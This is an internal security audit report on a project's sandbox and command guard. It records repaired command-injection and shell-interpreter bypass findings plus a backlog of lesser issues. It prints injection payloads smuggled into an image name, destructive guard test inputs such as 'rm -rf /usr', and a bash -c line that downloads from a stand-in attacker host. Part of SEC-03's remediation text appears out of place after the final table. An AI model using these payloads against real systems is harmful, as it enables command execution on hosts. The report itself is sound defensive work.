# SECURITY FINDINGS

**Phase:** 18-SECURITY
**Date:** 2026-02-10
**Method:** source audit + active execution probes (no finding is reported from
inspection alone; every claim was reproduced on this host)

---

## Summary

| Severity | Open | Repaired | Accepted backlog |
|---|---|---|---|
| BLOCKER | **0** | 0 | 0 |
| HIGH | **0** | **3** | 0 |
| MEDIUM | 0 | 0 | 5 |
| LOW | 0 | 0 | 3 |
| INFORMATIONAL | 0 | 0 | 2 |

**All 3 HIGH findings were repaired. 0 BLOCKER, 0 HIGH remain open.**

---

## SEC-01 — Command injection via sandbox image reference (HIGH, REPAIRED)

| Field | Value |
|---|---|
| Location | `packages/execution/src/autoforge_execution/sandbox/provider.py:621` (pre-fix) |
| Class | OS command injection (CWE-78) |
| Boundary | TB-09 sandbox image config → TB-08 shell execution |
| Violated | S-01, S-03, S-17 |

**Description.** `PodmanSandboxProvider.is_available()` probed for the image with:

```python
img_res = os.system(f"podman image exists {self.image} > /dev/null 2>&1")
```

`self.image` is operator/configuration-supplied and was interpolated into a shell
command string.

**Observed exploit.** With a stub `podman` on `PATH` (so the probe is reachable),
each of these executed `touch` on the host:

```
image = "localhost/autoforge-sandbox:latest; touch /tmp/af_injection_marker"   → EXECUTED
image = "localhost/autoforge-sandbox:latest && touch …"                       → EXECUTED
image = "localhost/autoforge-sandbox:latest`touch …`"                          → EXECUTED
image = "localhost/autoforge-sandbox:latest$(touch …)"                         → EXECUTED
image = "localhost/autoforge-sandbox:latest | touch …"                         → EXECUTED
```

**Aggravating factor — the bug was masked.** The attribute is `self._image`, not
`self.image`. The resulting `AttributeError` was swallowed by the surrounding
`except Exception`, so the sink returned `False` and looked "safe". The injection
was dormant purely by accident: any future fix to the attribute name would have
armed it. This is a latent HIGH, not a theoretical one.

**Remediation.** Replaced both probes with argv-only `subprocess.run(..., shell=False)`
and corrected the attribute to `self._image`. Post-fix, all five payloads return a
boolean and create no marker.

---

## SEC-02 — Boundary guard raised `AttributeError` instead of a security verdict (HIGH, REPAIRED)

| Field | Value |
|---|---|
| Location | `packages/orchestration/src/autoforge_orchestration/security.py:95` (pre-fix) |
| Class | Improper error handling / lost security audit trail |
| Boundary | TB-03 command guard |
| Violated | S-11, S-16 |

**Description.** On a forbidden-pattern match the guard built its denial message
from `match.pattern`. `match` is an `re.Match`, which has **no** `.pattern`
attribute, so every forbidden-pattern denial raised:

```
AttributeError: 're.Match' object has no attribute 'pattern'
```

**Observed.** `["sudo","ls"]`, `["rm","-rf","/usr"]` → `AttributeError`, not
`VerificationCommandError`.

**Why HIGH.** The orchestrator's broad `except Exception` still failed closed, so
no unauthorized command executed — but the security *denial reason* was destroyed.
The incident record became an internal-error string instead of an attributable
policy verdict, violating the auditability invariant S-16. Any future narrowing of
that `except` clause would silently convert denials into escapes.

**Remediation.** Use the compiled `pattern.pattern`. Denials now carry both a
human-readable reason and a structured `details` payload.

---

## SEC-03 — Shell interpreters passed the guard that forbids shell execution (HIGH, REPAIRED)

| Field | Value |
|---|---|
| Location | `packages/orchestration/src/autoforge_orchestration/security.py` `validate_command` |
| Class | Improper input validation / command execution (CWE-78, CWE-20) |
| Boundary | TB-03 stage `verification_commands` → TB-08 host execution |
| Violated | S-03, S-13, S-17 |

**Description.** `SecurityBoundaryGuard`'s docstring promises *"No shell execution
— argv lists only"*, and it blocked shell metacharacters `;|&$`<>(){}`. But it
never checked **which binary** was being executed. Since `bash -c "<payload>"`
carries an arbitrary command string containing *none* of those metacharacters,
every downstream check was passed transparently.

**Observed — all previously ALLOWED:**

```
["bash", "-c", "env"]                                        → ALLOWED
["sh", "-c", "env"]                                          → ALLOWED
["/bin/bash", "-c", "env"]                                   → ALLOWED
["zsh", "-c", "env"]                                         → ALLOWED
["env"]                                                      → ALLOWED
["bash", "-c", "curl -o /tmp/x http://attacker.test/p"]      → ALLOWED
```

---

## Accepted MEDIUM backlog

| ID | Finding | Why not repaired |
|---|---|---|
| SEC-07 | Unscoped `derive_artifact_key` can collide across projects | Unreachable on the production bridge (always passes `project_id`). Fixing changes 18-J/18-K identity semantics — explicitly out of scope. |
| SEC-09 | `apps/api` has no authentication/authorization | Local-first single-user design; loopback-bound by default. Adding auth would redesign the product boundary — out of scope. |
| SEC-11 | No dependency lockfile; no scanner installed | Dependency policy change, not a security defect. |
| SEC-12 | `modernization` recipe commands are argv-split, gated by `allow_external_install` | Admin-gated; reachable only if an operator opts in. |
| SEC-13 | `tooling_resolver` uses `shell=True` on a hardcoded verify table | Strings are module constants, not untrusted input. |

## LOW backlog

| ID | Finding |
|---|---|
| SEC-08 | API returns raw `str(e)` on exceptions (information disclosure, loopback-mitigated) |
| SEC-10 | `Access-Control-Allow-Origin: *` on API responses |
| SEC-14 | `compile_java`/`acquire_or_prepare` do not constrain `output_dir` to a sandbox root |

## INFORMATIONAL

| ID | Note |
|---|---|
| SEC-15 | No `pip-audit`/`safety` available. **No CVE is asserted** — inventing advisories is prohibited. |
| SEC-16 | `pytest.ini` is untracked; CI does not depend on it. |
`verification_commands` originates from stage metadata, i.e. project/workflow
configuration — attacker-influenceable in the A1 model.

**Remediation.** Added `_SHELL_INTERPRETERS`, matched on the **basename** so
absolute paths (`/bin/bash`) cannot evade it, and enforced it as the *first* check
so no later rule can be bypassed through an interpreter. Also rejects an empty
executable. Legitimate engineering commands (`pytest`, `javac`, `git status`,
`npm run build`, `node`) are unaffected — proven by T-13.